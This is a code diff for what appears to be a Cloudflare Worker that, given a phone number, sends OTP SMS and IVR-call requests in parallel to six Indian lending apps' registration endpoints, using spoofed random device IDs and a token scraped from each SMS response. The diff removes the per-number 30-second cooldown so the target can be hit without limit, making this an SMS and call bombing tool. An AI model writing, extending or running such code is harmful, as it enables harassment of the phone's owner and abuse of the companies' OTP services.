@@ -5,8 +5,6 @@ const fg = {
     fetch: (url, opts) => fetch(url, opts)
 };
 
-const COOLDOWN_SECONDS = 30;
-
 // ========================
 // Helper: random string
 // ========================
@@ -43,7 +41,7 @@ function randomUUID() {
 }
 
 // ========================
-// Helper: random request_id (SmartCoin style)
+// Helper: random request_id
 // ========================
 function randomRequestId() {
     return 'null' + Date.now() + Math.floor(Math.random() * 900 + 100);
@@ -217,13 +215,12 @@ async function sendKarzNiti(phone) {
 }
 
 // ========================
-// 5) SmartCoin SMS → Auto Token → IVR  (AUTO FLOW)
+// 5) SmartCoin SMS → Auto Token → IVR
 // ========================
 async function sendSmartCoin(phone) {
     const clean = phone.replace(/\D/g, '');
     if (clean.length !== 10) throw new Error('10 digits required');
 
-    // ==== Random device values (fresh per request) ====
     const android_id      = randomHex(16);
     const app_instance_id = randomHex(32);
     const google_ad_id    = randomUUID();
@@ -261,20 +258,16 @@ async function sendSmartCoin(phone) {
 
     const smsText = await smsRes.text();
 
-    // ==== Extract token from response ====
+    // Extract token
     let token = null;
-
-    // Pattern 1: phone_number/OnS.uHYn2O7ZIuw.6wcDXw
     let m = smsText.match(/phone_number\/([A-Za-z0-9._\-]+)/i);
     if (m) token = m[1];
 
-    // Pattern 2: escaped slash version
     if (!token) {
         m = smsText.match(/phone_number\\\/([A-Za-z0-9._\-]+)/i);
         if (m) token = m[1];
     }
 
-    // Pattern 3: JSON deep search
     if (!token) {
         try {
             const json = JSON.parse(smsText);
@@ -290,7 +283,7 @@ async function sendSmartCoin(phone) {
         };
     }
 
-    // ==== STEP 2: IVR API (auto-filled token) ====
+    // ==== STEP 2: IVR API ====
     const ivrUrl = 'https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/IVR'
         + `?phoneNumber=${encodeURIComponent(token)}`
         + `&isRetry=true&name=null&device_id=null&android_id=${android_id}`
@@ -408,7 +401,6 @@ async function safe(name, fn, phone) {
     try {
         const r = await fn(phone);
 
-        // SmartCoin returns object (not Response)
         if (r && r.sms && r.ivr) {
             return { name, success: r.sms.status === 200, ...r };
         }
@@ -428,32 +420,7 @@ async function safe(name, fn, phone) {
 }
 
 // ========================
-// Cooldown helpers (KV)
-// ========================
-async function isOnCooldown(env, phone) {
-    if (!env || !env.COOLDOWN_KV) return { cooldown: false };
-    const key = `cd:${phone}`;
-    const val = await env.COOLDOWN_KV.get(key);
-    if (!val) return { cooldown: false };
-
-    const expiresAt = parseInt(val, 10);
-    const now = Date.now();
-    if (now < expiresAt) {
-        const remaining = Math.ceil((expiresAt - now) / 1000);
-        return { cooldown: true, remaining };
-    }
-    return { cooldown: false };
-}
-
-async function setCooldown(env, phone) {
-    if (!env || !env.COOLDOWN_KV) return;
-    const key = `cd:${phone}`;
-    const expiresAt = Date.now() + COOLDOWN_SECONDS * 1000;
-    await env.COOLDOWN_KV.put(key, String(expiresAt), { expirationTtl: 60 });
-}
-
-// ========================
-// Worker Entry
+// Worker Entry (NO KV)
 // ========================
 export default {
     async fetch(request, env) {
@@ -473,21 +440,7 @@ export default {
             });
         }
 
-        // ⏳ Cooldown check
-        const cd = await isOnCooldown(env, clean);
-        if (cd.cooldown) {
-            return new Response(JSON.stringify({
-                mobile: clean,
-                cooldown: true,
-                remaining: cd.remaining,
-                message: `Please wait ${cd.remaining}s before retrying this number`
-            }), {
-                status: 429,
-                headers: { 'Content-Type': 'application/json' }
-            });
-        }
-
-        // 🔥 6 APIs parallel
+        // 🔥 6 APIs parallel — no cooldown
         const results = await Promise.all([
             safe('matepaisa', sendMatePaisa, clean),
             safe('velocity', sendVelocity, clean),
@@ -499,12 +452,8 @@ export default {
 
         const successCount = results.filter(r => r.success).length;
 
-        await setCooldown(env, clean);
-
         return new Response(JSON.stringify({
             mobile: clean,
-            cooldown: true,
-            cooldown_seconds: COOLDOWN_SECONDS,
             total: results.length,
             success: successCount,
             failed: results.length - successCount,
